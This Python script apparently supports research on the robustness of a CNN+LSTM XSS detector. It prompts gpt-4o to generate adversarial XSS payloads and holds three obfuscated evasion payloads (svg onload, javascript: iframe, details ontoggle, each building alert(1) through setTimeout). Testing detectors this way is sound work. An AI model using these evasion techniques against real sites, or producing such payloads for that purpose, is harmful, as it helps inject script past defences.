from openai import OpenAI
import os
from dotenv import load_dotenv

load_dotenv()  # 載入 .env 中的 OPENAI_API_KEY

client = OpenAI(api_key=os.getenv("OPENAI_API_KEY"))

response = client.chat.completions.create(
    model="gpt-4o",  # 或 gpt-3.5-turbo
    messages=[
        {"role": "system", "content": "你是一位 Web 資安專家，擅長製作對抗性 XSS 攻擊樣本"},
        {"role": "user", "content": (
            "我正在測試一個基於 CNN+LSTM 的 XSS 檢測系統，我想產生能繞過這個系統的 XSS 對抗樣本。"
            "它過去可以被以下 payload 成功繞過：\n"
            "1. <svg/onload=setTimeout('ale'+'rt(1)',100)></svg>\n"
            "2. <iframe src=\"javascript: setTimeout('ale'+'rt(1)', 100)\"></iframe>\n"
            "3. <details open ontoggle=\"setTimeout(unescape('%61%6c%65%72%74(1)'), 100)\"></details>\n"
            "請幫我再產生 5 個類似概念的對抗性 payload，"
            "使用非 script 標籤觸發、使用 setTimeout 或類似手法組合 alert(1)，避免被靜態分詞器解析。"
            "每個 payload 請用一行表示，只要逐行輸出編號跟 payload，不要額外說明"
        )}
    ],
    temperature=0.8
)

output = open("res/llm_output.txt", "a")
output.write(response.choices[0].message.content)

print("Finished!")
